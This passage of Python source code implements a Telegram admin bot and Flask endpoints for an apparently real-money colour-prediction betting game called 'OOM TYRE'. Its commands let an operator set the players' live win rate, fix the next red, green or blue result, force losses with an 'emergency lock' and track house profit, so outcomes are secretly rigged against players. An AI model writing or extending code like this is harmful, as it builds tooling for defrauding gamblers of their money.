        conn.close()
        return jsonify(
            {
                "status": "success",
                "message": f"Updated balance for '{username}'. New balance: ₹{new_bal}",
                "new_balance": new_bal,
            }
        )
    except Exception as e:
        conn.rollback()
        cursor.close()
        conn.close()
        return jsonify({"status": "error", "message": str(e)})


# --- TELEGRAM BOT HANDLERS ---
@bot.message_handler(commands=['start'])
def bot_start(message):
    bot.reply_to(
        message, 
        "⚡ **OOM TYRE Admin Control Panel**\n\n"
        "**Available Commands:**\n"
        "🔹 `/create user pass bal` - Create New User\n"
        "🔹 `/addbal user amt` - Add User Balance\n"
        "🔹 `/minusbal user amt` - Deduct User Balance\n"
        "🔹 `/setwin 30` - Set Live Win Rate (0-100%)\n"
        "🔹 `/red`, `/green`, `/blue` - Fix Next Result\n"
        "🔹 `/lock` - Toggle Forced Loss Emergency Lock\n"
        "🔹 `/house` - Live Daily Profit/Loss Report",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['create'])
def bot_create(message):
    try:
        parts = message.text.split()
        if len(parts) < 4:
            raise ValueError()
        _, user, pwd, bal = parts[:4]
        res = requests.post(f"{BACKEND_BASE_URL}/api/admin/create_user", json={
            "secret": ADMIN_SECRET, "username": user, "password": pwd, "balance": float(bal)
        }, timeout=5).json()
        
        if res.get("status") == "success":
            bot.reply_to(message, f"✅ Account Created: *{user}* | Balance: ₹{bal}", parse_mode="Markdown")
        else:
            bot.reply_to(message, f"❌ Error: {res.get('message')}")
    except Exception:
        bot.reply_to(message, "Format: `/create username password balance`", parse_mode="Markdown")

@bot.message_handler(commands=['addbal'])
def bot_addbal(message):
    try:
        _, user, amt = message.text.split()
        res = requests.post(f"{BACKEND_BASE_URL}/api/admin/update_balance", json={
            "secret": ADMIN_SECRET, "username": user, "action": "add", "amount": float(amt)
        }, timeout=5).json()
        
        if res.get("status") == "success":
            bot.reply_to(message, f"💰 {res.get('message')}")
        else:
            bot.reply_to(message, f"❌ Error: {res.get('message')}")
    except Exception:
        bot.reply_to(message, "Format: `/addbal username amount`", parse_mode="Markdown")

@bot.message_handler(files=None, commands=['minusbal'])
def bot_minusbal(message):
    try:
        _, user, amt = message.text.split()
        res = requests.post(f"{BACKEND_BASE_URL}/api/admin/update_balance", json={
            "secret": ADMIN_SECRET, "username": user, "action": "deduct", "amount": float(amt)
        }, timeout=5).json()
        
        if res.get("status") == "success":
            bot.reply_to(message, f"🔻 {res.get('message')}")
        else:
            bot.reply_to(message, f"❌ Error: {res.get('message')}")
    except Exception:
        bot.reply_to(message, "Format: `/minusbal username amount`", parse_mode="Markdown")

@bot.message_handler(commands=['setwin'])
def bot_setwin(message):
    try:
        _, rate = message.text.split()
        res = requests.post(BACKEND_URL, json={"winRate": float(rate), "secret": ADMIN_SECRET}, timeout=5).json()
        if res.get("success"):
            bot.reply_to(message, f"🎯 **Live Win Rate Set To:** {rate}%", parse_mode="Markdown")
        else:
            bot.reply_to(message, f"❌ Error: {res.get('message')}")
    except Exception:
        bot.reply_to(message, "Format: `/setwin <0-100>`", parse_mode="Markdown")

@bot.message_handler(commands=['red', 'green', 'blue'])
def bot_set_result(message):
    try:
        color = message.text.replace('/', '').strip().lower()
        res = requests.post(BACKEND_URL, json={"force_outcome": color, "secret": ADMIN_SECRET}, timeout=5).json()
        if res.get("success"):
            bot.reply_to(message, f"🎯 **Next Result Fixed:** {color.upper()}")
        else:
            bot.reply_to(message, "❌ Outcome set error.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['lock'])
def bot_lock(message):
    try:
        requests.post(BACKEND_URL, json={"emergency_lock": True, "secret": ADMIN_SECRET}, timeout=5)
        bot.reply_to(message, "🚨 **Emergency House Lock Activated!**")
    except Exception as e:
        bot.reply_to(message, f"❌ Lock error: {str(e)}")

@bot.message_handler(commands=['house'])
def bot_house(message):
    try:
        res = requests.get(f"{BACKEND_BASE_URL}/api/admin/house_stats?secret={ADMIN_SECRET}", timeout=5).json()
        if res.get("status") == "success":
            wagered = res.get("total_wagered", 0.0)
            payout = res.get("total_payout", 0.0)
            profit = res.get("house_profit", 0.0)
            status_emoji = "🟢 PROFIT" if profit >= 0 else "🔴 LOSS"
            msg = (
                f"📊 *DAILY HOUSE REPORT (Today)*\n\n"
                f"🎰 Total Bet: *₹{wagered:.2f}*\n"
                f"🏆 Total Won: *₹{payout:.2f}*\n"
                f"💰 House Profit: *₹{profit:.2f}* ({status_emoji})"
            )
            bot.reply_to(message, msg, parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ Stats fetch nahi ho sake.")
    except Exception as e:
        bot.reply_to(message, f"❌ Connection Error: {str(e)}")

def run_telegram_bot():
    print("🤖 Telegram Admin Bot Thread Starting...")
    try:
        bot.remove_webhook()
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        print(f"⚠️ Telegram Bot Error: {e}")


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    print("🚀 Starting Flask Server on Port 5000...")
    serve(app, host="0.0.0.0", port=5000)